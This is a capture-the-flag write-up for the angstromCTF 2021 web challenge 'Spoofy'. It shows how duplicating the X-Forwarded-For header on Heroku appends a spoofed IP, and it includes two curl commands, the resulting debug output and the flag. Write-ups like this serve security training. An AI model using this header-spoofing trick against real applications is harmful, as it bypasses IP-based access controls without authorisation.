# Spoofy - angstromCTF 2021

- Category: Web
- Points: 160
- Solves: 187
- Solved by: drw0if - raff01 - SM_SC2 - Iregon

## Description

Clam decided to switch from repl.it to an actual hosting service like Heroku. In typical clam fashion, he left a backdoor in. Unfortunately for him, he should've stayed with repl.it...

## Solution

We were given a python flask app which basically checks the `X-Forwarded-For` header. We started deploying our copy of the service in order to look at what heroku does during the forwarding and we saw that it just append our IP at the end of the header.

We then started googling a lot and suddeny popped up this [article](https://jetmind.github.io/2016/03/31/heroku-forwarded.html). So we tried what the article exposes:

```bash
curl https://test.herokuapp.com -H "X-Forwarded-For: 1.3.3.7" -H "X-Forwarded-For: 1.3.3.7"
```

and from the heroku debug we got:
```
['1.3.3.7', '1.2.3.4,1.3.3.7']
```

Bingo, we achieved appending stuff at the end of the header! We modified the second header definition:

```bash
curl https://test.herokuapp.com -H "X-Forwarded-For: 1.3.3.7" -H "X-Forwarded-For: , 1.3.3.7"
```
and everything was working on our side:
```
['1.3.3.7', '1.2.3.4,', '1.3.3.7']
```

We repeated thiat to the challenge app and we got the flag:

```
actf{spoofing_is_quite_spiffy}
```